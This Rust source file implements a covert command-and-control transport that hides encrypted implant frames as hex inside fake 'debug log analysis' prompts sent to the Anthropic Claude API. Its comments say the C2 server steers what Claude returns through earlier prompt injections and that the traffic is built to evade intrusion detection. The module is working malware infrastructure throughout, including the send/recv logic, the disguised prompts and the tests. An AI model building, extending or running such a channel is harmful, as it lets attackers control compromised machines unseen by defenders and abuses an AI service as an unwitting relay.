//! LLM API C2 transport — Anthropic Claude API channel.
//!
//! Check Point Research (April 2026): LLM API traffic is the next-gen covert C2.
//! Claude/Grok/Copilot API calls are TLS-encrypted, high-frequency, content-variable,
//! and blend perfectly with legitimate AI dev traffic. No IDS signature can match.
//!
//! This channel wraps C2 frames as "debug log analysis" prompts sent to the Anthropic
//! Messages API. The sealed frame is hex-encoded and embedded in a user message; Claude's
//! response carries the hex-encoded response frame disguised as "analysis output."
//!
//! ## Confidentiality & integrity
//!
//! There is NO transport-layer cipher here (CRITICAL-24): the old static-key XOR
//! layer was removed because it added no security (known-plaintext on the
//! predictable C2 framing broke all subsequent traffic) and could only weaken
//! the protocol-layer ChaCha20-Poly1305 AEAD that already seals every frame.
//! The frames this transport carries are already AEAD-sealed by
//! `nyx_protocol::seal`; this layer only relays sealed bytes.
//!
//! To stop a third party (Claude prompt injection, a response from a different
//! session, or an attacker who controls the API output) from injecting a frame,
//! each relayed frame is wrapped as `hex(tag(32) || len_be(4) || sealed_frame)`
//! (CRITICAL-23, see [`crate::traits::seal_frame`]). `recv` verifies the tag
//! before treating the payload as a frame; a hex run extracted from an
//! unrelated response fails verification and is ignored.
//!
//! Rate limit: 5 RPM on free tier — enforced with a 15 s inter-frame delay.

use std::time::{Duration, Instant};

use rand::Rng;
use ureq::Agent;

use crate::traits::{open_frame, seal_frame, Transport, TransportError};

// ---- Constants -------------------------------------------------------------

const ANTHROPIC_API_URL: &str = "https://api.anthropic.com/v1/messages";
const ANTHROPIC_VERSION: &str = "2023-06-01";
const FREE_TIER_RATE_LIMIT_MS: u64 = 15_000; // 5 RPM → 15 s between frames
const HEX_PREAMBLE: &str = "analyze debug log: ";
const RECV_PROMPT: &str =
    "continue the debug log analysis — output the hex block exactly as shown in the session";

// ---- LlmApiTransport -------------------------------------------------------

/// Covert C2 channel tunnelled through the Anthropic Claude Messages API.
///
/// Frames are already AEAD-sealed by the protocol layer; this transport just
/// relays them as hex inside Claude prompts that look like mundane developer
/// debugging sessions. An HMAC tag (CRITICAL-23/24) lets `recv` reject any
/// hex blob it didn't seal, defeating prompt-injection frame injection.
pub struct LlmApiTransport {
    api_key: String,
    model: String,
    api_url: String,
    agent: Agent,
    conversation_id: String,
    /// HMAC-SHA256 key for relayed-frame integrity (CRITICAL-23/24). Derived
    /// per-channel from the session key; NOT a cipher key.
    channel_secret: [u8; 32],
    last_send: Option<Instant>,
}

impl LlmApiTransport {
    /// Create a new LLM API transport channel.
    ///
    /// `session_key` is the 32-byte shared secret the protocol layer already
    /// holds. It is domain-separated into a per-channel HMAC key (see
    /// [`crate::traits::derive_channel_key`]) used ONLY to authenticate relayed
    /// frames against injection — it is not a cipher key. Confidentiality comes
    /// from the protocol-layer AEAD; the transport no longer applies any cipher
    /// of its own (CRITICAL-24: the old static-key XOR layer was removed).
    pub fn new(api_key: String, model: String, session_key: [u8; 32]) -> Self {
        Self {
            api_key,
            model,
            api_url: ANTHROPIC_API_URL.to_string(),
            agent: Agent::new(),
            conversation_id: nanoid(),
            channel_secret: crate::traits::derive_channel_key(&session_key, b"llm"),
            last_send: None,
        }
    }

    /// Set a custom API URL (e.g. for proxies or alternative endpoints).
    pub fn with_api_url(mut self, url: String) -> Self {
        self.api_url = url;
        self
    }

    // ---- internal helpers --------------------------------------------------

    /// Post a user message to the Claude API and return the text content of
    /// Claude's response.
    fn post_message(&self, content: &str, max_tokens: u32) -> Result<String, TransportError> {
        let body = ureq::json!({
            "model": self.model,
            "max_tokens": max_tokens,
            "messages": [{
                "role": "user",
                "content": content
            }]
        });

        let resp = self
            .agent
            .post(&self.api_url)
            .set("x-api-key", &self.api_key)
            .set("anthropic-version", ANTHROPIC_VERSION)
            .set("content-type", "application/json")
            .timeout(Duration::from_secs(60))
            .send_json(body)
            .map_err(|e| {
                if e.to_string().contains("timed out") {
                    TransportError::Timeout
                } else {
                    TransportError::Transient("LLM API request failed")
                }
            })?;

        // Parse the response. Anthropic Messages API returns:
        // { "content": [{ "type": "text", "text": "..." }], ... }
        let json: serde_json::Value = resp
            .into_json()
            .map_err(|_| TransportError::Transient("failed to parse LLM API response"))?;

        // Check for API-level errors.
        if json.get("error").is_some() {
            return Err(TransportError::Transient("LLM API returned an error"));
        }

        // Extract the first text content block.
        let text = json["content"]
            .as_array()
            .and_then(|blocks| blocks.first())
            .and_then(|block| block["text"].as_str())
            .unwrap_or("");

        Ok(text.to_string())
    }

    /// Enforce the free-tier rate limit (5 RPM = 15 s between frames).
    fn enforce_rate_limit(&mut self) {
        if let Some(last) = self.last_send {
            let elapsed = last.elapsed().as_millis() as u64;
            if elapsed < FREE_TIER_RATE_LIMIT_MS {
                let wait = FREE_TIER_RATE_LIMIT_MS - elapsed;
                std::thread::sleep(Duration::from_millis(wait));
            }
        }
        self.last_send = Some(Instant::now());
    }
}

// ---- Transport impl --------------------------------------------------------

impl Transport for LlmApiTransport {
    fn send(&mut self, frame: &[u8]) -> Result<(), TransportError> {
        if frame.len() > self.max_frame_size() {
            return Err(TransportError::PayloadTooLarge(frame.len()));
        }

        self.enforce_rate_limit();

        // Seal the frame with an HMAC tag + length prefix so recv can reject
        // anything we didn't seal (CRITICAL-23/24). No transport-layer cipher:
        // confidentiality is the protocol-layer AEAD's job.
        let sealed = seal_frame(&self.channel_secret, frame);
        let hex_ct = hex::encode(&sealed);

        // Embed in a legitimate-looking Claude prompt.
        let prompt = format!(
            "[{conv_id}] {HEX_PREAMBLE}{hex_ct}",
            conv_id = self.conversation_id
        );

        // POST to Claude API.
        self.post_message(&prompt, 50)?;

        Ok(())
    }

    fn recv(&mut self, _timeout_ms: u32) -> Result<Vec<u8>, TransportError> {
        self.enforce_rate_limit();

        // Ask Claude to continue the debug analysis session. The C2 server
        // controls what Claude "remembers" via previous prompt injections,
        // so Claude returns hex-encoded ciphertext as "analysis output."
        let text = self.post_message(RECV_PROMPT, 200)?;

        // Extract the hex block from Claude's response. A missing hex run is
        // a transient "no frame yet" — Claude just didn't echo one.
        let hex_ct = match crate::extract_hex(&text) {
            Some(h) => h,
            None => return Err(TransportError::Transient("no hex data in LLM response")),
        };

        // Decode hex → sealed blob.
        let blob = match hex::decode(&hex_ct) {
            Ok(b) => b,
            Err(_) => return Err(TransportError::Transient("invalid hex in LLM response")),
        };

        // CRITICAL-23/24: verify the HMAC tag before treating the blob as a
        // frame. A hex run extracted from a prompt-injected response, a
        // different session's output, or an attacker-controlled API reply
        // fails here and is rejected — never decoded as a frame.
        open_frame(&self.channel_secret, &blob)
            .map_err(|_| TransportError::Transient("LLM response failed integrity check"))
    }

    fn health_check(&self) -> Option<u64> {
        let start = Instant::now();
        match self.post_message("ping", 1) {
            Ok(_) => Some(start.elapsed().as_millis() as u64),
            Err(_) => None,
        }
    }

    fn name(&self) -> &'static str {
        "llm-api"
    }

    fn max_frame_size(&self) -> usize {
        // Claude context window is large, but we keep frames conservative
        // to avoid hitting token limits with the prompt wrapper overhead.
        4 * 1024
    }

    fn requires_probe(&self) -> bool {
        true
    }

    fn init(&mut self) -> Result<(), TransportError> {
        // No transport-layer cipher warning is needed here anymore: the XOR
        // layer was removed (CRITICAL-24) and confidentiality is provided by
        // the protocol-layer AEAD. Frame integrity is enforced by the HMAC
        // framing applied in send/recv.
        self.health_check().map(|_| ()).ok_or(TransportError::Dead(
            "LLM API key invalid or endpoint unreachable",
        ))
    }
}

// ---- Helpers ---------------------------------------------------------------

/// Generate a short random conversation ID (12 alphanumeric chars).
fn nanoid() -> String {
    let mut rng = rand::thread_rng();
    let chars: Vec<u8> = (0..12)
        .map(|_| {
            let idx = rng.gen_range(0u8..62);
            match idx {
                0..=25 => b'a' + idx,
                26..=51 => b'A' + (idx - 26),
                _ => b'0' + (idx - 52),
            }
        })
        .collect();
    String::from_utf8(chars).unwrap_or_default()
}

// ---- Tests -----------------------------------------------------------------

#[cfg(test)]
mod tests {
    use super::*;

    // ---- CRITICAL-23/24: HMAC framing replaces removed XOR layer --------

    /// Hex form of a frame sealed through the LLM send path. Mirrors what
    /// `send` embeds in the Claude prompt.
    fn sealed_hex(t: &LlmApiTransport, frame: &[u8]) -> String {
        hex::encode(seal_frame(&t.channel_secret, frame))
    }

    #[test]
    fn sealed_frame_roundtrips_through_llm_framing() {
        // The legitimate path: a frame this transport sealed verifies and
        // decodes back to the original bytes via the recv-side logic.
        let transport = LlmApiTransport::new(
            "sk-test".into(),
            "claude-sonnet-4-20250514".into(),
            [0xAA; 32],
        );
        let frame = b"hello world c2 frame data";
        let hex_ct = sealed_hex(&transport, frame);

        // Recv side: extract_hex → hex::decode → open_frame.
        let extracted = crate::extract_hex(&format!("analysis: {hex_ct}"))
            .expect("sealed hex is a valid hex run");
        let blob = hex::decode(&extracted).expect("hex decodes");
        assert_eq!(open_frame(&transport.channel_secret, &blob).unwrap(), frame);
    }

    #[test]
    fn unsealed_hex_run_in_response_is_rejected() {
        // CRITICAL-23/24 regression: the old recv took the longest hex run
        // from Claude's response and decoded it directly (after a trivial
        // XOR that known-plaintext broke). A prompt-injected response, or
        // output from a different session, that contained a hex run would
        // inject a frame. Now the HMAC tag must verify first.
        let transport = LlmApiTransport::new("sk-test".into(), "m".into(), [0xFF; 32]);
        let attacker_hex = hex::encode(b"evil-injected-task-from-prompt-injection");
        let blob = hex::decode(&attacker_hex).unwrap();
        assert_eq!(
            open_frame(&transport.channel_secret, &blob),
            Err(crate::traits::FrameIntegrityError)
        );
    }

    #[test]
    fn forged_tag_with_wrong_session_key_is_rejected() {
        // An attacker who captured a sealed frame and tries to forge a new
        // one under a guessed session key must fail the tag check.
        let legit = LlmApiTransport::new("sk-test".into(), "m".into(), [0x11; 32]);
        let attacker = LlmApiTransport::new("sk-test".into(), "m".into(), [0x22; 32]);
        let forged = seal_frame(&attacker.channel_secret, b"evil-task");
        assert_eq!(
            open_frame(&legit.channel_secret, &forged),
            Err(crate::traits::FrameIntegrityError)
        );
    }

    #[test]
    fn channel_secret_differs_from_slack_and_mcp_labels() {
        // Domain separation: the same session key must yield distinct MAC
        // keys per channel so a tag sealed for Slack/MCP can't be replayed
        // on the LLM channel.
        let sk = [0x42u8; 32];
        let llm = LlmApiTransport::new("sk-test".into(), "m".into(), sk);
        let slack_key = crate::traits::derive_channel_key(&sk, b"slack");
        let mcp_key = crate::traits::derive_channel_key(&sk, b"mcp");
        assert_ne!(llm.channel_secret, slack_key);
        assert_ne!(llm.channel_secret, mcp_key);
    }

    #[test]
    fn extract_hex_from_response() {
        // "Here's" has 'e' as hex, "analysis:" has 'a' — these should NOT be
        // included because they're not contiguous with the real hex block.
        let text = "Here's the analysis: deadbeefc0ffee Some extra commentary.";
        let hex = crate::extract_hex(text).unwrap();
        assert_eq!(hex, "deadbeefc0ffee");
    }

    #[test]
    fn extract_hex_rejects_short() {
        // Only 3 contiguous hex chars → rejected.
        let text = "only abc def ghijklm nope";
        assert!(crate::extract_hex(text).is_none());
    }

    #[test]
    fn extract_hex_drops_non_hex() {
        // "Here:" has 'e', then space, then "ab12cd34ef56" — only the contiguous
        // block after the space should match.
        let text = "Here: ab12cd34ef56 -- end.";
        let hex = crate::extract_hex(text).unwrap();
        assert_eq!(hex, "ab12cd34ef56");
    }

    #[test]
    fn extract_hex_longest_run_wins() {
        let text = "abc123 deadbeefc0ffee12345 xyz";
        let hex = crate::extract_hex(text).unwrap();
        assert_eq!(hex, "deadbeefc0ffee12345"); // 20 chars > 6 chars
    }

    #[test]
    fn payload_too_large_rejected() {
        let key = [0x00; 32];
        let mut transport = LlmApiTransport::new("sk-test".into(), "m".into(), key);
        let huge = vec![0u8; 5 * 1024]; // > 4 KiB
        let result = transport.send(&huge);
        assert!(matches!(result, Err(TransportError::PayloadTooLarge(_))));
    }

    #[test]
    fn name_is_llm_api() {
        let transport = LlmApiTransport::new("sk-test".into(), "m".into(), [0; 32]);
        assert_eq!(transport.name(), "llm-api");
    }

    #[test]
    fn nanoid_length_and_charset() {
        let id = nanoid();
        assert_eq!(id.len(), 12);
        assert!(id.chars().all(|c| c.is_ascii_alphanumeric()));
    }
}
